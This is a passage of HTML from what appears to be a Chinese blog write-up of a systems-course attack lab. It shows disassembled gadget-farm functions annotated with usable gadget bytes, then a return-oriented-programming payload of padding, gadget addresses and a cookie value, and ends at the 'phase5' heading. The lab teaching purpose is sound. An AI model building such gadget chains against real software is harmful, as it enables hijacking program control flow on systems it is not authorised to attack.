+</span></span><span class="line"><span class="cl"><span class="mh">0000000000401ada</span> <span class="p">&lt;</span><span class="no">getval_227</span><span class="p">&gt;:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">ada:</span>	<span class="nf">b8</span> <span class="mi">65</span> <span class="mi">48</span> <span class="mi">89</span> <span class="no">c7</span>       	<span class="no">mov</span>    <span class="no">$0xc7894865</span><span class="p">,</span><span class="nv">%eax</span> <span class="c1">; 2.2 2.8 48 89 c7 movq %rax,%rdi(401adc) ---1.2把rdi设置成cookie值
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="err">401</span><span class="nl">adf:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mh">0000000000401ae0</span> <span class="p">&lt;</span><span class="no">getval_437</span><span class="p">&gt;:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">ae0:</span>	<span class="nf">b8</span> <span class="mi">49</span> <span class="mi">89</span> <span class="no">c7</span> <span class="mi">90</span>       	<span class="no">mov</span>    <span class="no">$0x90c78949</span><span class="p">,</span><span class="nv">%eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">ae5:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mh">0000000000401ae6</span> <span class="p">&lt;</span><span class="no">setval_348</span><span class="p">&gt;:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">ae6:</span>	<span class="nf">c7</span> <span class="mi">07</span> <span class="mi">48</span> <span class="mi">89</span> <span class="no">c7</span> <span class="no">c3</span>    	<span class="no">movl</span>   <span class="no">$0xc3c78948</span><span class="p">,(</span><span class="nv">%rdi</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">aec:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mh">0000000000401aed</span> <span class="p">&lt;</span><span class="no">setval_136</span><span class="p">&gt;:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">aed:</span>	<span class="nf">c7</span> <span class="mi">07</span> <span class="mi">58</span> <span class="mi">90</span> <span class="mi">90</span> <span class="mi">90</span>    	<span class="no">movl</span>   <span class="no">$0x90909058</span><span class="p">,(</span><span class="nv">%rdi</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">af3:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mh">0000000000401af4</span> <span class="p">&lt;</span><span class="no">mid_farm</span><span class="p">&gt;:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">af4:</span>	<span class="nf">b8</span> <span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="no">mov</span>    <span class="no">$0x1</span><span class="p">,</span><span class="nv">%eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">af9:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mh">0000000000401afa</span> <span class="p">&lt;</span><span class="no">add_xy</span><span class="p">&gt;:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">afa:</span>	<span class="err">48</span> <span class="err">8</span><span class="nf">d</span> <span class="mi">04</span> <span class="mi">37</span>          	<span class="no">lea</span>    <span class="p">(</span><span class="nv">%rdi</span><span class="p">,</span><span class="nv">%rsi</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="nv">%rax</span> <span class="c1">; 2.7(401afa) 这里就是直接设计好的
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="err">401</span><span class="nl">afe:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mh">0000000000401aff</span> <span class="p">&lt;</span><span class="no">getval_314</span><span class="p">&gt;:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">aff:</span>	<span class="nf">b8</span> <span class="no">a9</span> <span class="no">c9</span> <span class="no">d6</span> <span class="mi">90</span>       	<span class="no">mov</span>    <span class="no">$0x90d6c9a9</span><span class="p">,</span><span class="nv">%eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">b04:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mh">0000000000401b05</span> <span class="p">&lt;</span><span class="no">addval_442</span><span class="p">&gt;:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">b05:</span>	<span class="err">8</span><span class="nf">d</span> <span class="mi">87</span> <span class="mi">48</span> <span class="mi">09</span> <span class="no">e0</span> <span class="mi">90</span>    	<span class="no">lea</span>    <span class="p">-</span><span class="mi">0x6f1ff6b8</span><span class="p">(</span><span class="nv">%rdi</span><span class="p">),</span><span class="nv">%eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">b0b:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mh">0000000000401b0c</span> <span class="p">&lt;</span><span class="no">addval_139</span><span class="p">&gt;:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">b0c:</span>	<span class="err">8</span><span class="nf">d</span> <span class="mi">87</span> <span class="mi">89</span> <span class="no">ca</span> <span class="mi">90</span> <span class="mi">90</span>    	<span class="no">lea</span>    <span class="p">-</span><span class="mi">0x6f6f3577</span><span class="p">(</span><span class="nv">%rdi</span><span class="p">),</span><span class="nv">%eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">b12:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mh">0000000000401b13</span> <span class="p">&lt;</span><span class="no">addval_491</span><span class="p">&gt;:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">b13:</span>	<span class="err">8</span><span class="nf">d</span> <span class="mi">87</span> <span class="mi">1</span><span class="no">f</span> <span class="mi">4</span><span class="no">b</span> <span class="mi">89</span> <span class="no">d6</span>    	<span class="no">lea</span>    <span class="p">-</span><span class="mi">0x2976b4e1</span><span class="p">(</span><span class="nv">%rdi</span><span class="p">),</span><span class="nv">%eax</span> <span class="c1">; 2.6(401b17) mov    %edx,%esi
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="err">401</span><span class="nl">b19:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mh">0000000000401b1a</span> <span class="p">&lt;</span><span class="no">setval_367</span><span class="p">&gt;:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">b1a:</span>	<span class="nf">c7</span> <span class="mi">07</span> <span class="no">bb</span> <span class="mi">48</span> <span class="mi">89</span> <span class="no">e0</span>    	<span class="no">movl</span>   <span class="no">$0xe08948bb</span><span class="p">,(</span><span class="nv">%rdi</span><span class="p">)</span> <span class="c1">; 2.1(401b1d) mov    %rsp,%rax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="err">401</span><span class="nl">b20:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mh">0000000000401b21</span> <span class="p">&lt;</span><span class="no">getval_215</span><span class="p">&gt;:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">b21:</span>	<span class="nf">b8</span> <span class="mi">48</span> <span class="mi">89</span> <span class="no">e0</span> <span class="no">c1</span>       	<span class="no">mov</span>    <span class="no">$0xc1e08948</span><span class="p">,</span><span class="nv">%eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">b26:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mh">0000000000401b27</span> <span class="p">&lt;</span><span class="no">setval_192</span><span class="p">&gt;:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">b27:</span>	<span class="nf">c7</span> <span class="mi">07</span> <span class="mi">89</span> <span class="no">c1</span> <span class="mi">92</span> <span class="mi">90</span>    	<span class="no">movl</span>   <span class="no">$0x9092c189</span><span class="p">,(</span><span class="nv">%rdi</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">b2d:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mh">0000000000401b2e</span> <span class="p">&lt;</span><span class="no">getval_418</span><span class="p">&gt;:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">b2e:</span>	<span class="nf">b8</span> <span class="mi">89</span> <span class="no">ca</span> <span class="mi">84</span> <span class="no">c0</span>       	<span class="no">mov</span>    <span class="no">$0xc084ca89</span><span class="p">,</span><span class="nv">%eax</span> <span class="c1">;2.5(401b2f) mov    %ecx,%edx test   %al,%al
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="err">401</span><span class="nl">b33:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mh">0000000000401b34</span> <span class="p">&lt;</span><span class="no">addval_318</span><span class="p">&gt;:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">b34:</span>	<span class="err">8</span><span class="nf">d</span> <span class="mi">87</span> <span class="mi">8</span><span class="no">b</span> <span class="no">d6</span> <span class="mi">84</span> <span class="no">c0</span>    	<span class="no">lea</span>    <span class="p">-</span><span class="mi">0x3f7b2975</span><span class="p">(</span><span class="nv">%rdi</span><span class="p">),</span><span class="nv">%eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">b3a:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mh">0000000000401b3b</span> <span class="p">&lt;</span><span class="no">setval_167</span><span class="p">&gt;:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">b3b:</span>	<span class="nf">c7</span> <span class="mi">07</span> <span class="mi">48</span> <span class="mi">89</span> <span class="no">e0</span> <span class="mi">94</span>    	<span class="no">movl</span>   <span class="no">$0x94e08948</span><span class="p">,(</span><span class="nv">%rdi</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">b41:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mh">0000000000401b42</span> <span class="p">&lt;</span><span class="no">setval_410</span><span class="p">&gt;:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">b42:</span>	<span class="nf">c7</span> <span class="mi">07</span> <span class="no">df</span> <span class="mi">89</span> <span class="no">ca</span> <span class="mi">91</span>    	<span class="no">movl</span>   <span class="no">$0x91ca89df</span><span class="p">,(</span><span class="nv">%rdi</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">b48:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mh">0000000000401b49</span> <span class="p">&lt;</span><span class="no">setval_408</span><span class="p">&gt;:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">b49:</span>	<span class="nf">c7</span> <span class="mi">07</span> <span class="mi">95</span> <span class="mi">48</span> <span class="mi">81</span> <span class="no">e0</span>    	<span class="no">movl</span>   <span class="no">$0xe0814895</span><span class="p">,(</span><span class="nv">%rdi</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">b4f:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mh">0000000000401b50</span> <span class="p">&lt;</span><span class="no">setval_115</span><span class="p">&gt;:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">b50:</span>	<span class="nf">c7</span> <span class="mi">07</span> <span class="mi">88</span> <span class="no">d6</span> <span class="mi">90</span> <span class="no">c3</span>    	<span class="no">movl</span>   <span class="no">$0xc390d688</span><span class="p">,(</span><span class="nv">%rdi</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">b56:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mh">0000000000401b57</span> <span class="p">&lt;</span><span class="no">setval_336</span><span class="p">&gt;:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">b57:</span>	<span class="nf">c7</span> <span class="mi">07</span> <span class="mi">48</span> <span class="mi">89</span> <span class="no">e0</span> <span class="mi">90</span>    	<span class="no">movl</span>   <span class="no">$0x90e08948</span><span class="p">,(</span><span class="nv">%rdi</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">b5d:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mh">0000000000401b5e</span> <span class="p">&lt;</span><span class="no">addval_315</span><span class="p">&gt;:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">b5e:</span>	<span class="err">8</span><span class="nf">d</span> <span class="mi">87</span> <span class="mi">89</span> <span class="no">c1</span> <span class="no">a4</span> <span class="no">c0</span>    	<span class="no">lea</span>    <span class="p">-</span><span class="mi">0x3f5b3e77</span><span class="p">(</span><span class="nv">%rdi</span><span class="p">),</span><span class="nv">%eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">b64:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mh">0000000000401b65</span> <span class="p">&lt;</span><span class="no">setval_400</span><span class="p">&gt;:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">b65:</span>	<span class="nf">c7</span> <span class="mi">07</span> <span class="mi">89</span> <span class="no">ca</span> <span class="mi">28</span> <span class="no">d2</span>    	<span class="no">movl</span>   <span class="no">$0xd228ca89</span><span class="p">,(</span><span class="nv">%rdi</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">b6b:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mh">0000000000401b6c</span> <span class="p">&lt;</span><span class="no">getval_226</span><span class="p">&gt;:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">b6c:</span>	<span class="nf">b8</span> <span class="mi">88</span> <span class="no">d6</span> <span class="mi">38</span> <span class="no">c0</span>       	<span class="no">mov</span>    <span class="no">$0xc038d688</span><span class="p">,</span><span class="nv">%eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">b71:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mh">0000000000401b72</span> <span class="p">&lt;</span><span class="no">getval_388</span><span class="p">&gt;:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">b72:</span>	<span class="nf">b8</span> <span class="no">c9</span> <span class="no">c1</span> <span class="mi">20</span> <span class="no">c9</span>       	<span class="no">mov</span>    <span class="no">$0xc920c1c9</span><span class="p">,</span><span class="nv">%eax</span> <span class="c1">; (401b75)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="err">401</span><span class="nl">b77:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mh">0000000000401b78</span> <span class="p">&lt;</span><span class="no">getval_379</span><span class="p">&gt;:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">b78:</span>	<span class="nf">b8</span> <span class="mi">68</span> <span class="mi">89</span> <span class="no">e0</span> <span class="no">c3</span>       	<span class="no">mov</span>    <span class="no">$0xc3e08968</span><span class="p">,</span><span class="nv">%eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">b7d:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mh">0000000000401b7e</span> <span class="p">&lt;</span><span class="no">getval_495</span><span class="p">&gt;:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">b7e:</span>	<span class="nf">b8</span> <span class="mi">89</span> <span class="no">d6</span> <span class="mi">92</span> <span class="no">c3</span>       	<span class="no">mov</span>    <span class="no">$0xc392d689</span><span class="p">,</span><span class="nv">%eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">b83:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mh">0000000000401b84</span> <span class="p">&lt;</span><span class="no">addval_434</span><span class="p">&gt;:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">b84:</span>	<span class="err">8</span><span class="nf">d</span> <span class="mi">87</span> <span class="mi">89</span> <span class="no">ca</span> <span class="mi">28</span> <span class="no">d2</span>    	<span class="no">lea</span>    <span class="p">-</span><span class="mi">0x2dd73577</span><span class="p">(</span><span class="nv">%rdi</span><span class="p">),</span><span class="nv">%eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">b8a:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mh">0000000000401b8b</span> <span class="p">&lt;</span><span class="no">getval_382</span><span class="p">&gt;:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">b8b:</span>	<span class="nf">b8</span> <span class="mi">4</span><span class="no">c</span> <span class="mi">89</span> <span class="no">e0</span> <span class="no">c3</span>       	<span class="no">mov</span>    <span class="no">$0xc3e0894c</span><span class="p">,</span><span class="nv">%eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">b90:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mh">0000000000401b91</span> <span class="p">&lt;</span><span class="no">addval_100</span><span class="p">&gt;:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">b91:</span>	<span class="err">8</span><span class="nf">d</span> <span class="mi">87</span> <span class="no">c9</span> <span class="no">c1</span> <span class="mi">84</span> <span class="no">c9</span>    	<span class="no">lea</span>    <span class="p">-</span><span class="mi">0x367b3e37</span><span class="p">(</span><span class="nv">%rdi</span><span class="p">),</span><span class="nv">%eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">b97:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mh">0000000000401b98</span> <span class="p">&lt;</span><span class="no">setval_140</span><span class="p">&gt;:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">b98:</span>	<span class="nf">c7</span> <span class="mi">07</span> <span class="no">f8</span> <span class="mi">8</span><span class="no">b</span> <span class="no">c1</span> <span class="no">c3</span>    	<span class="no">movl</span>   <span class="no">$0xc3c18bf8</span><span class="p">,(</span><span class="nv">%rdi</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">b9e:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mh">0000000000401b9f</span> <span class="p">&lt;</span><span class="no">setval_104</span><span class="p">&gt;:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">b9f:</span>	<span class="nf">c7</span> <span class="mi">07</span> <span class="mi">88</span> <span class="no">c1</span> <span class="mi">84</span> <span class="no">c0</span>    	<span class="no">movl</span>   <span class="no">$0xc084c188</span><span class="p">,(</span><span class="nv">%rdi</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">ba5:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mh">0000000000401ba6</span> <span class="p">&lt;</span><span class="no">addval_125</span><span class="p">&gt;:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">ba6:</span>	<span class="err">8</span><span class="nf">d</span> <span class="mi">87</span> <span class="mi">89</span> <span class="no">d6</span> <span class="mi">90</span> <span class="no">c3</span>    	<span class="no">lea</span>    <span class="p">-</span><span class="mi">0x3c6f2977</span><span class="p">(</span><span class="nv">%rdi</span><span class="p">),</span><span class="nv">%eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">bac:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mh">0000000000401bad</span> <span class="p">&lt;</span><span class="no">getval_111</span><span class="p">&gt;:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">bad:</span>	<span class="nf">b8</span> <span class="mi">16</span> <span class="no">a9</span> <span class="mi">09</span> <span class="no">ca</span>       	<span class="no">mov</span>    <span class="no">$0xca09a916</span><span class="p">,</span><span class="nv">%eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">bb2:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mh">0000000000401bb3</span> <span class="p">&lt;</span><span class="no">getval_256</span><span class="p">&gt;:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">bb3:</span>	<span class="nf">b8</span> <span class="no">a9</span> <span class="no">ca</span> <span class="mi">20</span> <span class="no">db</span>       	<span class="no">mov</span>    <span class="no">$0xdb20caa9</span><span class="p">,</span><span class="nv">%eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">bb8:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mh">0000000000401bb9</span> <span class="p">&lt;</span><span class="no">getval_170</span><span class="p">&gt;:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">bb9:</span>	<span class="nf">b8</span> <span class="mi">89</span> <span class="no">c1</span> <span class="mi">08</span> <span class="no">d2</span>       	<span class="no">mov</span>    <span class="no">$0xd208c189</span><span class="p">,</span><span class="nv">%eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">bbe:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mh">0000000000401bbf</span> <span class="p">&lt;</span><span class="no">setval_102</span><span class="p">&gt;:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">bbf:</span>	<span class="nf">c7</span> <span class="mi">07</span> <span class="mi">0</span><span class="no">e</span> <span class="mi">89</span> <span class="no">c1</span> <span class="no">c3</span>    	<span class="no">movl</span>   <span class="no">$0xc3c1890e</span><span class="p">,(</span><span class="nv">%rdi</span><span class="p">)</span> <span class="c1">; 2.4(401bc2) mov    %eax,%ecx
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="err">401</span><span class="nl">bc5:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mh">0000000000401bc6</span> <span class="p">&lt;</span><span class="no">getval_364</span><span class="p">&gt;:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">bc6:</span>	<span class="nf">b8</span> <span class="mi">81</span> <span class="no">d6</span> <span class="mi">90</span> <span class="mi">90</span>       	<span class="no">mov</span>    <span class="no">$0x9090d681</span><span class="p">,</span><span class="nv">%eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">bcb:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mh">0000000000401bcc</span> <span class="p">&lt;</span><span class="no">setval_159</span><span class="p">&gt;:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">bcc:</span>	<span class="nf">c7</span> <span class="mi">07</span> <span class="mi">89</span> <span class="no">ca</span> <span class="no">c1</span> <span class="no">ce</span>    	<span class="no">movl</span>   <span class="no">$0xcec1ca89</span><span class="p">,(</span><span class="nv">%rdi</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">bd2:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mh">0000000000401bd3</span> <span class="p">&lt;</span><span class="no">end_farm</span><span class="p">&gt;:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">bd3:</span>	<span class="nf">b8</span> <span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="no">mov</span>    <span class="no">$0x1</span><span class="p">,</span><span class="nv">%eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">bd8:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    
+</span></span></code></pre></div><p>那么我们输入的字节码如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> 
+</span></span><span class="line"><span class="cl"><span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> 
+</span></span><span class="line"><span class="cl"><span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> 
+</span></span><span class="line"><span class="cl"><span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> 
+</span></span><span class="line"><span class="cl"><span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> 
+</span></span><span class="line"><span class="cl"><span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> 
+</span></span><span class="line"><span class="cl"><span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> 
+</span></span><span class="line"><span class="cl"><span class="nf">c3</span> <span class="mi">1</span><span class="no">a</span> <span class="mi">40</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> 
+</span></span><span class="line"><span class="cl"><span class="mi">6</span><span class="no">f</span> <span class="mi">64</span> <span class="no">e6</span> <span class="mi">14</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> 
+</span></span><span class="line"><span class="cl"><span class="no">dc</span> <span class="mi">1</span><span class="no">a</span> <span class="mi">40</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> 
+</span></span><span class="line"><span class="cl"><span class="mi">11</span> <span class="mi">19</span> <span class="mi">40</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> 
+</span></span></code></pre></div><blockquote>
+<p>一定要把地址数清楚孩子们，因为有一个地址我没有数清楚而浪费了很长时间，不过解决段错误也是一种学习。（很难蚌的住啊）</p></blockquote>
+
+
+<h2 class="relative group">phase5: 
+    <div id="phase5" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#phase5" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<blockquote>
+<p>据说这是最难的一层，不过既然已经接触了汇编语言，那还是来试试看！</p>
